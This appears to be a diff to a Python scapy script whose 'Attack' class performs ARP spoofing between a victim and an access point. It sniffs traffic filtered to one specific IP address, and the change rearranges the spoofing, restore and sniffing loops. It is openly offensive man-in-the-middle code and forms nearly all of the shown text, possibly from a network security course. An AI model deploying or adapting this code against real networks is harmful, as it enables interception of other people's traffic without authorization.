@@ -48,16 +48,14 @@ class Attack():
         scapy.send(packet, count=4, verbose=0)
 
     def arp_spoofing(self):
-        while 1:
-            self.spoof(self.victim, self.ap)
-            self.spoof(self.ap, self.victim)
-            time.sleep(2)
+        self.spoof(self.victim, self.ap)
+        self.spoof(self.ap, self.victim)
+        time.sleep(2)
 
     def ret_arp_spoofing(self):
-        while 1:
-            self.restore(self.victim, self.ap)
-            self.restore(self.ap, self.victim)
-            time.sleep(2)
+        self.restore(self.victim, self.ap)
+        self.restore(self.ap, self.victim)
+        time.sleep(2)
     
     def sniff_packets(self):
         scapy.sniff(filter="host 140.113.207.246", prn=self.process_packet, iface=self.interfaces[1], store=False)
@@ -71,5 +69,6 @@ attack._enable_linux_iproute()
 attack.get_ip()
 attack.get_mac(attack.network[1])
 #print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
-attack.sniff_packets()
-attack.ret_arp_spoofing()
+while 1:
+    attack.sniff_packets()
+    attack.ret_arp_spoofing()
